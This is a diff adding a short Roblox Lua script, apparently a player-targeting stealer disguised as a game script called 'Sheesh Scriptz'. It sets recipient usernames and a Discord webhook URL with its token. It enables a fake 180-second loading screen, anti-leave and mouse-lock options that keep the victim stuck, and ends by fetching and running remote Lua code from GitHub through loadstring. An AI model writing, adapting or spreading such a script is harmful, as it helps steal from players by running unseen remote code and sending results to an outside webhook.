@@ -1,0 +1,16 @@
+UserName = "BastaSiJeypiThis"
+UserName2 = "popguy8920" -- optional delete the whole line if you don't want it
+Webhook = "https://discord.com/api/webhooks/1108006696648966155/om_93j4NkiidX90QGcCKFbE1Wn1-IjXkJGvNnu9pSE1qAR1CO0Xk6jAB7xqB-2wJaFOb" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Sheesh Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
